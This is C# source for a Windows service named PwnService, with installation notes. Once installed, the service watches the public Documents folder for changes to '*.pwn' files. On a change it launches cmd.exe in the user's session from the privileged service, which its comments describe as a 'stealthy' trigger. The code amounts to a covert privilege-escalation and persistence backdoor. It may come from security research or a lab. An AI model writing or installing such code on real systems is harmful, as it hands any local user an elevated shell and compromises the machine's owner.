using System.Diagnostics;
using System.IO;
using System.ServiceProcess;

/**
 * Notes about service installation:
 *  - Start a VS 2017 command prompt as Administrator
 *  - Go to the directory containing the service binary to install
 *  - installutil /u PwnService.exe to uninstall
 *  - installutil PwnService.exe to install
 *  - net start PwnService to start the service
 *  - net stop PwnService to stop the service
 */
namespace PwnService
{
    public partial class PwnService : ServiceBase
    {
        EventLog eventLog;
        FileSystemWatcher watcher;

        public PwnService()
        {
            InitializeComponent();

            eventLog = new EventLog();
            if (!EventLog.SourceExists("PwnServiceSource"))
            {
                EventLog.CreateEventSource("PwnServiceSource", "PwnServiceLog");
            }
            eventLog.Source = "PwnServiceSource";
            eventLog.Log = "PwnServiceLog";
        }

        private void OnChanged(object source, FileSystemEventArgs e)
        {
            RunProcessAs.RunCmdInUsersSession("cmd.exe", eventLog);
        }

        protected override void OnStart(string[] args)
        {
            eventLog.WriteEntry("Starting PwnService");

            /* be a bit stealthy and require a file named *.pwn be modified in C:\Users\Public\Documents */
            watcher = new FileSystemWatcher
            {
                Path = "C:\\Users\\Public\\Documents",
                NotifyFilter = NotifyFilters.LastAccess |
                                     NotifyFilters.LastWrite |
                                     NotifyFilters.FileName |
                                     NotifyFilters.DirectoryName,
                Filter = "*.pwn",
                EnableRaisingEvents = true
            };
            watcher.Changed += new FileSystemEventHandler(OnChanged);
        }

        protected override void OnStop()
        {
            eventLog.WriteEntry("Stopping PwnService");
        }
    }
}
